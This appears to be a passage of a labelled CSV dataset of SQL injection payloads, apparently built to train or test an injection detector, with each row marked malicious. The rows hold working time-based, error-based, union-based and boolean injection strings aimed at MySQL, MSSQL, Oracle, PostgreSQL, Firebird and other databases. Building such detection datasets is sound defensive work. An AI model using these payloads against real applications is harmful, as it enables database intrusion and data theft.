row_index,payload_norm,label,sqli_type_hint
3630,"1' ) ) as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3631,1 ) as rlft where 1670 = 1670 waitfor delay '0:0:5'--,1,
3632,"1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,
3633,"-6406%' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '",1,
3634,-9311 ) ) or ( 5065 = 2572 ) *2572 and ( ( 1199 = 1199,1,
3635,"1"" ) as tnux where 4888 = 4888 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,
3636,"1' ) ) and elt ( 6847 = 5874,5874 ) and ( ( 'yspu' = 'yspu",1,
3637,"-7746' ) union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1,
3638,"1"" where 2677 = 2677 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1,
3639,"1%""",1,
3640,"1'|| ( select 'odud' from dual where 2468 = 2468 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3641,end and ( ( '%' = ',1,
3642,"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--",1,
3643,"1"" ) as lvbm where 8179 = 8179",1,
3644,-7231 ) ) union all select 7639#,1,
3645,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) -- rlas",1,
3646,1'+ ( select 'gtqr' where 5660 = 5660,1,
3647,"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3648,"1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--",1,
3649,"1' ) ) as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",1,
3650,"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""ruvo"" like ""ruvo",1,
3651,-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq,1,
3652,"-1676'|| ( select 'xzmu' from dual where 6373 = 6373 union all select 6373,6373--",1,
3653,"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",1,
3654,"-7611 ) as tuje where 6101 = 6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1,
3655,"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""bmbg"" like ""bmbg",1,
3656,"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1,
3657,1' ) ) as yyud where 4934 = 4934,1,
3658,"-7744"" ) ) ) union all select 9408,9408,9408,9408--",1,
3659,"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'msjw' like 'msjw",1,
